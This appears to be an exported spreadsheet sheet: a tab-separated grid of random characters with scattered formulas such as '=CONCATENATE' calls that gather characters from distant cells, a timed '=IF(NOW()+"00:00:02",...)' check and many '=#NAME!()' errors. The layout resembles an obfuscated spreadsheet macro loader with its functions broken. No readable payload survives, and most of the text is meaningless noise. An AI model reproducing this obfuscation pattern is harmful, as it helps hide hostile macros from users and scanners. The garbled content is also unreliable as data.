k	$	-	x	9	_	x	T	'	u	0	/	a	x	P	d	|	v	W	3	<	|	I	2	:	f
%	z	K	8	N	H	@	f	M	)	f	"	P	b	r	m	O	,	m	j	)	|	d	e	X	*
z	j	*	V	G	"	I	X	y	^	`	V	C	|	V	|	#	<	<	`	*	v	n	G	s	`
=	5	5	d	|	-	-	P	)	6	3	#	B	3	w	H	/	%	`	`	u	!	>	(	,	 
|	`	t	e	.	#	<	T	N	-	C	l	w	"	B	c	6	T	P	_	n	7	{	[	v	/
\	s	 	J	7	J	f	 	3	u	.	~	L	K	@	9	'	*	o	m	?	,	i	/	7	@
C	\	C	g	0	'	j	`	W	T	X	5	c	6	K	L	3	)	S	@	~	3	|	_	9	D
G	?	E	\	e	5	|	U	_	o	$	j	D	^	a	f	'	Z	3	-	B	0	z	U	r	x
&	K	@	I	 	l	&	c	)	/	T	#	h	2	<	<	?	u	?	d	0	o	3	N	|	?
Z	 	]	N	T	J	6	I	h	8	_	d	u	>	*	#	V	[	[	:	Z	?	#	*	g	p
T	3	i	Z	>	M	8	x	w	Y	+	#	s	G	:	!	t	Y	8	$	l	$	V	f	M	3
N	7	`	c	/	2	O	V	@	7	r	w	y	6	)	F	"	U	{	!	B	9	i	P	$	c
0	k	q	D	s	H	I	G	E	G	z	.	2	m	J	_	,	i	r	v	,	u	V	Q	T	(
i	J	B	;	j	b	_	1	c	R	v	e	<	^	L	T	R	K	5	:	K	e	]	K	d	,
a	v	t	<	!	a	C	^	)	_	$	-	{	b	G	/	=	"	F	{	:	[	5	X	2	9
W	w	k	z	h	~	|	x	i	R	'	8	{	$	/	8	!	y	u	W	y	+	n	%	N	k
r	U	W	y	8	}	p	[	x	Q	#	#	V	?	r	'	#	J	S	7	M	;	)	s	W	G
o	+	)	|	Z	d	;	%	 	Q	M	"	@	I	F	-	L	*	1	K	{	r	h	L	-	?
e	g	u	`	e	=	!	_	,	o	q	Z	=	a	V	F	R	k	K	u	:	0	W	(	R	4
:	4	_	X	C	F	0	<	v	X	!	(	O	l	1	]	g	 	e	q	q	o	K	8	R	P
Y	A	'	~	~	q	P	(	5	m	5	~	e	g	;	g	X	Q	S	r	"	n	F	_	)	_
-	x	"	@	6	w	e	 	z	Y	i	F	P	?	F	M	r	n	}	}	=	9	t	#	w	I
?	e	^	~	2	%	v	9	O	f	_	.	:	n	W	-	h	J	%	4	S	[	>	W	e	P
m	H	9	 	m	-	Z	W	z	_	?	$	j	a	z	~	i	:	r	$	W	v	x	&	~	1
<	+	[	2	^	Y	P	4	Z	f	%	p	S	w	q	S	6	z	R	{	j	]	$	R	f	H
y	Y	(	O	v	#	q	,	E	u	b	T	@	M	q	k	H	W	B	q	4	N	k	$	d	_
<	j	'	c	c	6	T	|	K	h	}	Q	O	u	6	Q	`	Z	B	C	 	G	#	E	:	j
z	t	;	B	\	%	{	/	:	h	g	`	=	M	?	~	?	s	3	:	L	K	`	/	l	9
E	&	<	6	I	6	/	j	r	m	b	;	(	H	1	7	N	?	T	N	?	?	4	 	;	o
:	$	]	:	 	Y	F	z	1	O	}	(	U	&	 	%	C	l	/	n	j	2	q	Z	0	B
A	7	9	q	E	m	9	q	R	M	0	4	0	4	y	h	&	o	s	9	[	{	D	l	\	A
/	z	N	s	l	&	,	q	T	t	G	w	h	K	[	%	U	3	N	O	j	}	6	'	^	6
D	6	|	"	8	l	a	Y	y	,	R	N	)	&	N	k	6	d	]	`	e	/	V	U	~	U
y	4	Z	s	I	d	^	G	N	[	M	O	6	R	=	E	b	n	~	s	W	$	@	d	@	:
d	%	^	)	"	{	t	B	g	!	D	k	J	+	G	_	n	`	}	/	}	k	7	l	+	Z
^	F	$	 	;	+	^	&	Y	"	b	.	4	y	n	@	v	;	u	=	;	r	0	>	B	L
i	e	D	n	"	g	j	D	0	q	1	W	&	&	}	+	<	8	`	1	l	u	2	S	`	q
`	]	4	+	:	T	4	f	_	9	(	7	h	~	J	q	G	9	n	,	M	g	(	q	5	L
+	F	d	P	}	U	F	`	 	 	;	Q	4	R	Z	y	g	}	o	K	.	o	+	}	z	B
/	x	8	y	-	.	^	e	=	k	U	r	~	S	9	1	t	]	R	H	?	h	9	G	K	}
h	L	U	W	=	=	H	N	/	*	c	g	`	c	o	D	>	z	W	^	f	'	^	m	E	3
[	4	O	w	{	3	E	.	-	<	o	9	h	:	1	D	&	2	b	r	S	^	"	V	b	f
.	*	?	/	`	3	&	C	W	*	(	g	<	h	0	W	Z	3	2	F	l	F	q	:	E	;
x	A	:	x	6	*	;	3	#	n	d	E	H	g	0	'	,	L	G	>	(	.	t	m	n	k
V	v	d	#	L	.	-	P	z	D	<	q	G	}	c	0	X	I	r	g	<	)	S	V	*	x
I	J	2	}	8	,	_	v	%	`	-	8	C	a	N	!	x	.	w	=	p	U	8	I	O	A
"	J	~	|	g	.	1	!	.	d	m	:	M	[	*	b	"	b	V	T	+	s	(	z	'	?
F	#	J	E	n	z	j	6	U	h	V	a	7	A	'	%	r	F	>	5	l	e	9	)	+	0
%	,	z	Z	9	{	S	m	[	V	&	L	N	0	2	'	b	~	s	s	C	7	O	3	?	c
#	/	q	;	F	o	W	=	`	#	w	v	Y	y	i	e	W	N	a	r	e	+	{	u	>	n
W	p	b	;	Q	I	y	]	F	m	Q	4	J	C	#	>	D	b	H	&	V	.	l	.	q	i
7	x	2	y	{	{	E	b	{	'	o	?	G	[	P	\	Q	 	M	Q	?	v	P	:	}	P
v	V	E	c	@	<	S	8	>	:	e	H	L	.	-	X	T	~	f	Z	0	B	k	s	U	(
I	P	I	2	)	b	b	L	}	b	`	4	~	5	n	_	%	z	1	I	#	B	V	D	t	|
H	1	G	(	L	z	.	r	X	*	#	*	q	1	r	.	S	 	v	K	v	x	N	]	w	O
:	x	m	m	 	t	M	x	j	n	1	-	\	5	p	F	R	i	L	j	'	 	E	_	n	@
s	T	j	[	<	>	l	X	m	b	2	M	l	^	E	|	!	o	*	=	)	`	$	D	H	K
E	m	 	@	^	k	)	 	c	]	V	U	!	M	9	X	%	x	n	(	c	=	R	=	*	l
~	7	p	B	$	W	r	R	<	L	9	T	e	O	&	U	G	f	_	*	v	c	^	{	E	H
q	V	N	%	T	n	p	*	<	[	M	p	'	!	g	B	h	l	?	Y	)	K	/	#	2	j
+	h	k	*	J	B	l	y	4	0	e	E	r	Y	G	W	^	e	e	8	+	q	!	#	<	T
O	Z	,	I	:	q	:	A	g	(	@	=	8	I	|	-	.	k	6	!	P	5	v	D	4	#
z	<	K	b	f	S	!	z	P	x	6	R	i	B	 	;	$	}	R	y	L	g	m	G	"	W
]	d	&	0	K	F	c	E	V	l	t	:	d	n	N	 	4	C	o	1	G	d	s	s	1	h
\	l	!	1	@	@	"	g	]	B	U	]	J	J	3	#	#	Y	R	~	j	!	C	%	"	g
"	v	Q	V	F	9	'	,	N	O	R	L	j	5	W	u	9	N	I	i	1	K	*	v	L	D
#	J	T	X	3	a	f	R	i	X	q	l	y	L	Q	[	^	=#NAME!()	]	d	u	u	{	d	;	g
4	W	e	4	Q	q	$	9	`	/	%	!	9	{	l	N	"	=IF(FALSE(),#NAME!())	m	n	P	O	 	a	R	+
B	K	R	j	;	E	G	f	p	)	t	_	I	;	i	#	a	=#NAME!()	]	6	.	S	)	C	*	8
x	V	:	w	$	F	S	#	>	+	 	G	A	\	e	K	?	=#NAME!()	S	u	6	/	V	6	<	[
n	T	>	$	y	,	v	c	D	=CONCATENATE(T1000,W1063,O1107,K1131,D517)	0	{	]	g	T	r	b	=#NAME!()	V	<	9	x	t	Z	C	*
!	i	;	"	R	g	f	I	}	0	(	$	3	"	i	`	{	=#NAME!()	w	{	D	\	c	h	#	}
q	u	F	J	$	*	;	Y	1	5	i	]	?	#	!	[	"	=#NAME!()	~	B	<	n	;	s	%	T
U	R	o	 	"	\	V	f	`	R	7	]	A	C	q	A	=	=	A	/	E	5	3	o	2	F
T	@	{	n	,	H	k	O	w	9	8	W	u	I	-	B	&	q	8	D	/	2	B	@	N	1
w	e	!	|	:	}	>	h	9	\	{	R	b	F	q	z	V	]	<	{	Z	B	@	'	n	M
<	V	g	^	?	:	[	A	<	_	I	G	=	$	D	;	k	8	+	%	2	5	u	/	|	O
t	i	t	X	x	)	c	C	d	g	<	z	+	X	"	i	=	X	;	_	=	2	4	d	V	v
E	l	+	E	o	V	Z	.	`	`	R	u	_	j	<	b	t	:	H	V	x	3	R	^	C	2
.	f	{	I	b	H	i	.	,	^	D	v	%	:	J	p	<	a	=	(	$	T	=	3	Q	,
e	/	X	_	Z	m	#	a	h	G	B	K	/	(	E	U	~	|	$	s	c	p	Z	\	l	n
9	z	|	|	T	'	=	R	=	O	m	I	|	O	!	/	Q	z	a	I	$	;	M	A	X	}
e	I	1	X	/	`	,	w	<	t	X	c	T	B	E	_	0	h	}	h	}	F	P	>	2	.
?	f	O	`	'	z	|	n	 	M	V	p	{	8	1	-	W	\	-	J	M	_	7	V	|	k
g	}	F	)	u	L	c	!	O	L	D	O	&	.	T	u	`	W	F	*	n	W	^	B	n	S
x	R	.	<	}	7	!	0	x	!	G	f	2	z	2	}	l	J	r	{	 	%	-	`	.	G
O	a	n	K	8	V	'	j	+	/	0	'	I	0	k	Q	^	L	%	Y	I	4	~	6	\	a
z	D	!	W	a	)	&	=	B	"	1	3	'	c	w	6	;	j	`	h	z	S	k	4	L	y
n	9	^	6	H	'	*	E	m	b	;	z	9	S	W	f	8	b	p	.	;	4	|	w	_	?
d	?	8	y	h	4	I	3	Y	]	+	H	m	C	w	/	p	n	G	e	a	@	E	A	&	S
`	g	*	 	k	{	J	`	t	X	g	'	k	r	(	W	#	+	-	"	k	I	'	H	+	m
5	A	K	f	f	Z	/	?	+	 	T	}	k	x	w	!	D	B	X	d	J	#	Z	"	Y	t
+	;	a	F	,	T	`	~	{	t	O	9	]	k	}	3	h	q	<	<	?	)	C	&	9	'
;	[	_	F	?	i	x	0	P	r	'	5	|	V	;	&	5	5	[	{	I	'	H	g	q	}
N	K	Q	r	r	#	c	]	P	0	U	S	_	;	=	P	P	H	"	0	3	3	S	y	6	<
n	(	s	|	g	F	5	s	'	F	v	u	.	U	J	)	>	p	I	b	F	O	N	o	u	y
r	&	a	#	t	:	f	3	v	r	8	N	4	<	k	U	3	~	q	Z	^	q	M	Q	$	I
0	Y	y	u	`	;	{	2	E	Z	F	E	<	;	r	M	y	@	t	W	e	\	[	)	V	U
2	a	p	p	z	q	X	J	?	V	A	u	k	=	U	~	c	`	u	:	w	{	r	>	C	{
"	D	P	\	x	G	W	%	B	6	h	O	f	!	=	#	E	D	!	3	,	^	#	x	a	=
J	)	#	 	&	=CONCATENATE(K1184,Y420,D450)	v	^	r	v	I	b	s	x	T	W	k	[	Q	[	F	[	.	%	i	~
}	h	s	z	-	V	m	Y	7	t	I	+	8	7	$	h	;	"	y	"	N	X	r	=	]	.
%	@	X	]	$	8	g	!	m	v	_	z	-	t	k	 	Q	/	^	9	<	T	7	\	7	%
]	r	z	Y	Y	l	A	l	j	U	X	5	+	!	t	(	W	Z	A	J	a	0	@	]	u	L
d	l	X	;	7	:	5	E	y	2	{	&	4	l	`	]	-	&	]	l	j	x	H	S	s	h
z	3	p	}	&	J	A	b	"	'	=CONCATENATE(Q880,V1048)	P	}	*	X	e	B	>	4	e	P	P	Y	:	8	_
(	>	8	)	L	~	M	|	1	?	p	r	(	S	Z	T	0	j	@	Y	)	v	<	A	W	/
@	O	d	@	u	z	g	9	R	[	{	I	;	r	{	+	8	X	<	g	b	*	"	f	/	6
~	T	O	C	d	^	_	q	@	5	4	U	z	!	b	g	u	k	%	0	v	w	g	m	f	#
8	J	X	<	+	A	y	e	z	f	#	&	5	O	6	g	J	^	x	u	l	V	Q	R	t	^
o	s	A	N	"	(	/	^	N	 	\	n	I	z	f	G	E	4	H	u	X	-	J	l	R	,
,	|	x	h	,	u	w	a	l	]	W	d	4	#	_	^	D	i	<	C	<	S	O	S	5	a
}	9	f	 	D	2	^	=	q	J	c	K	2	v	J	W	8	6	W	=	{	f	S	`	.	r
^	.	y	L	T	l	f	K	w	0	e	J	t	-	`	G	i	=	W	-	O	a	~	G	X	,
J	t	z	d	o	c	/	D	b	u	V	U	Z	5	s	.	e	{	0	U	%	f	4	&	}	j
3	K	W	*	H	r	O	C	O	B	>	j	i	A	~	J	b	(	<	$	v	,	f	n	[	U
 	/	m	;	}	s	O	\	=	R	z	]	s	#	.	p	 	L	]	a	t	c	o	g	Q	e
I	o	b	C	#	;	K	<	r	N	,	G	M	r	#	t	8	6	q	+	(	_	P	*	@	i
Y	k	j	V	V	O	K	]	T	5	b	l	5	G	o	 	R	C	`	T	K	W	T	1	g	'
`	Y	R	#	,	Y	_	t	#	%	0	Y	4	;	p	{	O	g	?	J	J	s	v	^	S	"
j	'	w	<	q	P	/	;	z	o	Z	^	X	C	'	l	G	H	q	&	!	]	7	;	X	j
+	u	=	V	 	o	a	v	E	T	$	X	,	m	;	*	}	1	1	X	C	9	k	o	]	^
N	j	U	?	8	d	S	B	S	a	p	3	~	j	u	>	.	*	4	s	d	I	Z	w	N	Q
n	\	'	6	>	&	]	i	E	*	a	Y	K	@	i	+	x	b	}	A	2	p	{	T	5	E
I	'	L	g	&	l	Q	8	+	W	2	Z	`	F	0	W	t	p	g	l	:	P	;	>	S	%
v	P	b	Y	M	}	.	i	L	9	F	6	5	C	k	H	X	/	r	L	!	]	F	I	s	P
+	Q	+	C	6	5	>	^	;	Z	e	H	-	:	T	e	n	<	k	v	[	p	.	t	;	h
F	0	"	|	[	1	c	?	W	_	\	q	y	}	A	{	\	:	H	q	y	F	?	H	s	z
8	:	_	*	w	-	p	"	E	F	5	j	G	b	'	a	3	w	Y	?	R	O	C	U	^	$
x	I	n	`	A	2	:	D	 	S	|	@	l	3	M	g	6	-	f	G	'	T	s	6	 	)
"	`	}	%	[	X	P	{	e	y	.	8	]	O	%	h	f	!	A	/	,	6	#	y	0	W
Z	i	#	C	6	v	`	0	<	-	Q	2	0	\	P	m	L	>	N	z	0	!	^	B	L	y
G	;	h	D	S	h	`	1	^	!	m	U	J	%	n	`	p	H	3	f	%	Z	=	g	i	U
<	6	H	X	W	B	m	|	s	A	Y	J	q	g	'	x	T	q	k	<	r	m	B	8	/	0
Z	y	Q	&	 	l	>	&	'	!	*	m	]	w	&	r	t	f	9	-	^	K	j	e	K	O
c	3	\	[	5	5	r	+	b	Y	b	?	S	t	J	}	Z	2	F	n	{	/	D	 	-	u
J	t	q	8	l	&	9	!	_	Q	j	U	x	T	!	]	k	8	;	n	o	;	U	'	D	 
\	l	K	"	@	:	J	:	h	x	C	L	]	3	k	+	B	N	]	|	?	M	e	^	r	N
m	$	S	d	,	,	.	K	Z	y	.	l	V	1	O	w	7	l	{	@	I	v	U	N	u	~
x	H	o	v	/	1	x	N	2	c	z	m	5	{	#	x	W	J	D	8	i	0	-	I	y	K
P	:	-	%	u	a	2	D	'	:	\	`	t	b	i	8	{	q	G	;	C	V	K	r	:	_
S	P	o	h	O	3	.	X	.	>	k	+	|	:	v	P	G	h	"	g	h	A	*	e	8	l
2	:	_	&	[	*	s	#	S	+	$	R	A	1	5	P	g	u	\	q	d	y	/	+	Y	T
^	z	p	7	B	p	6	8	v	)	b	|	N	7	0	v	`	+	T	@	:	=	t	4	=	^
 	Q	@	T	!	j	t	@	I	n	?	t	}	&	;	h	g	r	P	`	a	j	g	7	$	,
i	.	h	O	!	s	}	<	|	Q	N	X	&	4	g	J	?	'	T	M	!	g	9	e	/	\
4	c	#	G	q	5	y	R	^	6	U	m	d	R	C	t	Z	~	s	6	v	R	7	d	R	O
E	<	"	u	u	q	!	0	j	g	M	e	i	X	v	K	)	'	#	V	|	n	C	A	j	y
.	Y	e	L	z	R	x	:	X	1	W	{	U	"	Z	-	U	/	@	>	@	 	*	I	"	.
N	S	s	G	>	q	9	p	#	B	f	{	8	^	&	P	I	,	\	C	^	/	)	$	y	C
!	%	&	>	Y	=	e	7	C	q	&	D	M	4	 	y	g	!	?	`	K	t	{	{	y	V
h	)	R	;	s	b	@	0	o	F	A	;	Q	3	B	<	u	t	q	g	b	r	T	3	@	G
=	k	%	+	=	N	N	5	(	z	M	'	E	-	X	0	9	'	r	!	<	h	p	j	E	u
[	n	S	f	k	+	R	h	T	4	z	E	]	/	f	h	)	z	-	D	0	s	o	f	G	k
,	'	^	/	3	l	v	F	#	z	]	.	o	_	(	b	)	N	[	-	V	<	'	X	/	}
@	*	_	!	X	V	?	3	X	?	-	C	0	|	y	%	R	c	P	o	4	u	4	v	w	w
'	C	7	j	(	T	?	P	l	 	b	o	}	f	?	q	6	Q	]	W	3	y	Z	I	!	,
v	\	t	O	?	'	y	)	Q	.	(	P	g	z	:	n	E	2	 	#	D	`	0	E	,	F
7	y	_	.	J	-	1	5	Y	g	3	P	0	n	z	=	:	v	.	#	_	t	0	b	o	9
7	b	J	&	r	8	W	i	U	1	A	V	]	T	+	p	{	,	%	s	X	b	p	8	q	V
E	p	_	:	R	P	4	N	$	'	m	C	Q	6	z	^	K	K	,	|	7	@	X	^	a	Z
m	:	9	8	O	o	M	x	K	{	C	~	u	A	 	h	1	\	f	1	n	,	-	A	Z	5
]	a	m	q	S	%	.	}	h	1	C	1	j	>	C	)	`	k	k	2	=	0	F	.	h	_
k	~	d	%	O	:	<	*	*	(	N	/	c	[	j	2	O	E	!	w	2	!	O	1	W	y
}	p	O	$	/	t	B	S	u	]	M	`	y	v	H	)	O	R	G	=	T	z	4	`	a	(
N	[	l	^	)	K	A	[	Q	h	d	+	F	w	1	`	M	M	T	&	g	o	:	"	\	5
|	d	:	s	;	M	9	>	9	`	n	e	9	]	2	%	7	@	i	;	i	+	X	^	c	l
s	%	H	{	U	.	a	8	0	D	.	~	s	,	C	M	i	)	~	z	A	z	I	9	9	|
s	1	+	{	L	j	U	<	n	(	'	,	d	s	I	I	M	w	 	9	M	o	p	^	@	G
o	m	-	e	6	m	1	t	V	W	P	A	O	C	O	H	H	a	z	C	X	J	;	0	H	#
y	,	f	@	e	B	!	C	(	!	l	5	s	t	O	|	j	M	9	)	O	Q	a	N	8	F
;	,	{	^	E	M	W	i	M	.	G	P	C	k	P	T	<	?	C	g	A	%	i	v	g	f
:	e	8	=	f	Q	5	*	2	8	B	3	;	d	.	j	 	w	t	4	s	;	u	V	w	Q
P	"	2	8	@	L	n	4	q	_	E	D	"	:	~	/	T	^	l	p	e	=	g	D	h	7
=	l	p	s	L	8	K	w	{	=	Z	Q	?	M	x	e	K	B	p	p	^	?	x	V	L	c
?	.	|	_	i	)	G	%	>	m	|	%	j	@	H	%	@	3	K	=	d	^	g	/	{	{
9	 	;	y	)	,	y	C	'	^	9	Z	}	4	i	|	"	m	f	*	R	E	(	#	5	C
*	:	_	v	L	Q	{	&	W	0	!	4	W	c	Y	P	m	!	P	Z	"	h	G	;	:	{
M	(	(	8	w	e	9	H	u	Y	A	<	D	L	:	X	?	=	e	.	"	*	b	|	a	?
0	-	[	C	:	f	|	"	.	S	z	$	N	T	u	X	<	q	?	l	/	$	0	G	)	X
^	i	=#NAME!()	M	7	L	z	>	Q	>	W	h	E	B	`	|	/	,	@	!	6	!	g	^	;	'
<	S	a	4	I	@	-	k	p	|	>	R	M	)	y	C	S	y	:	C	u	^	[	/	i	4
Z	S	Q	^	T	h	C	?	F	h	;	>	m	w	>	|	|	C	s	^	v	8	^	W	d	M
8	C	i	Y	%	>	F	(	X	J	w	t	/	{	g	(	N	|	}	'	I	U	m	{	Q	,
>	R	<	z	H	]	5	=	K	}	P	=	9	k	>	s	e	m	V	:	=	.	6	3	 	r
}	g	:	2	>	x	o	b	U	@	*	_	i	\	*	{	u	$	"	}	I	@	N	"	H	w
7	n	.	h	/	]	N	l	K	H	+	u	-	l	n	g	-	H	2	o	e	.	+	Z	S	O
J	(	O	U	l	R	7	B	~	i	.	Y	%	Y	u	@	X	E	|	v	\	D	s	E	C	+
{	x	+	u	o	~	A	w	.	c	Y	4	*	I	 	F	O	8	H	C	Z	G	G	j	$	d
K	4	2	+	$	V	-	U	[	Y	i	z	!	P	4	r	o	X	T	w	E	=	i	K	N	#
v	+	V	l	C	r	e	l	%	D	F	 	2	(	;	V	m	U	d	p	C	(	N	+	[	a
n	0	.	B	3	q	I	)	D	P	_	c	t	5	`	j	D	>	R	h	m	o	\	o	v	[
{	B	F	H	3	#	[	"	l	V	U	:	J	r	p	n	W	M	z	M	~	i	.	)	=	x
&	O	#	Y	s	:	w	m	/	u	J	/	G	H	M	N	?	6	A	?	W	-	a	@	d	Y
3	2	W	V	!	g	H	/	L	a	[	t	O	u	~	|	a	p	y	;	)	1	~	,	v	m
S	1	5	M	8	\	D	i	,	5	;	a	;	$	L	f	O	P	P	5	e	z	=	1	l	I
@	{	=	M	L	h	,	I	)	>	W	,	O	K	Y	;	E	y	7	Q	/	B	g	P	]	+
6	U	o	X	S	l	~	Y	/	V	D	9	u	!	6	w	J	$	L	S	C	/	.	X	^	B
|	j	-	[	t	E	G	+	d	Q	W	F	s	0	/	e	8	7	s	G	J	N	v	j	}	b
:	f	F	#	=	\	h	!	p	{	J	<	D	o	c	6	D	3	N	t	_	7	x	&	Q	G
;	>	B	l	q	 	"	H	s	b	G	G	M	a	p	@	w	#	8	1	c	1	s	C	5	/
|	:	X	i	I	d	R	i	G	:	R	-	(	<	K	v	h	l	R	Z	 	j	#	[	O	{
<	f	u	n	D	8	|	p	H	n	^	b	m	j	&	o	I	Q	a	t	z	A	]	>	\	E
Z	w	-	o	]	C	r	L	q	W	U	k	J	P	(	m	k	Q	>	g	u	T	J	B	w	Y
,	/	f	i	e	B	x	:	h	]	K	<	v	C	.	y	M	]	E	N	]	Y	e	#	\	(
/	o	D	l	?	Y	&	_	*	|	w	q	n	9	/	v	r	U	_	W	U	D	-	/	2	'
F	^	D	e	s	t	m	]	o	6	7	M	'	Y	$	L	{	y	%	~	L	/	0	{	T	q
Q	+	!	i	p	u	L	b	c	b	D	p	Z	@	Z	(	;	g	U	G	x	i	X	A	Q	f
/	Y	i	m	`	l	5	c	 	L	P	?	L	c	n	z	%	M	o	:	U	y	n	X	B	Z
1	F	.	l	2	C	E	n	x	Q	|	c	K	b	^	|	/	%	i	i	i	$	q	K	i	r
^	`	#	x	l	?	1	2	B	V	Q	#	5	b	o	'	Y	>	6	_	x	(	K	%	:	o
A	:	+	I	*	j	Y	?	`	z	'	L	d	@	F	[	n	d	m	H	~	\	o	%	u	`
<	K	K	:	P	J	=CONCATENATE(P1047,C593,C1040)	z	Y	\	d	J	\	%	q	c	?	y	M	D	A	M	H	0	(	K
I	y	b	0	C	J	z	z	O	8	$	[	x	Q	/	b	(	Z	9	S	c	L	H	#	v	8
|	c	=	k	 	J	V	7	K	1	6	c	Z	%	B	(	c	e	=	m	p	T	I	%	x	"
S	0	l	U	D	?	N	?	&	I	b	1	H	[	$	5	;	C	_	$	`	Y	G	O	q	D
b	]	H	M	R	N	o	.	=	&	c	y	(	 	"	d	_	e	9	Y	[	A	M	s	b	E
;	$	U	=IF(NOW()+"00:00:02","KsshpqC4Mo",#NAME!())	F	Z	u	.	S	3	r	i	,	%	9	]	A	@	l	]	D	7	_	"	B	5
=#NAME!()																									
=#NAME!()																									
